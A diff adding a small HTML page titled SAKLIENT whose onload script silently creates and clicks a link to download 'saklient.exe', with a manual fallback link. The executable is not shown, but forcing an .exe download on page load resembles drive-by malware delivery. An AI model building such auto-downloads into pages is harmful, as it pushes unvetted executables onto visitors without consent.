@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>SAKLIENT</title>
+  <script>
+    window.onload = function() {
+
+      let link = document.createElement("a");
+      link.href = "saklient.exe";
+      link.download = "saklient.exe";
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+    };
+  </script>
+</head>
+<body>
+  <h1>Your download should start automatically...</h1>
+  <p>If it doesn’t, <a href="saklient.exe" download>click here to download manually</a>.</p>
+</body>
+</html>
